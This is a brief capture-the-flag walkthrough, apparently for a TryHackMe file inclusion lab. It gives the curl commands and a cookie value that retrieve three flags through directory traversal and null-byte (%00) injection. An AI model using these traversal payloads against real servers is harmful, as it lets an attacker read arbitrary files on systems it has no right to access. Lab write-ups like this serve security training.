# File Inclusion Challenge Walkthrough

## Flag1

```
curl -v http://{VICTIM MACHINE IP}/challenges/chall1.php -X  POST -d 'file=../../../../etc/flag1' -o flag1.txt

cat flag1.txt
```

The flag is NOT in the usual ```THM{FLAG}``` format.


## Flag2

This is used as a cookie. Once entered, you are going to need to refresh the page. 

```
THM=../../../../etc/flag2%00
```

## Flag3

```
curl -v http://{VICTIM MACHINE IP}/challenges/chall3.php -X  POST -d 'file=/etc/flag3%00' -o flag3.txt

cat flag3.txt
```

Remember that the flag is not in the usual THM format. 
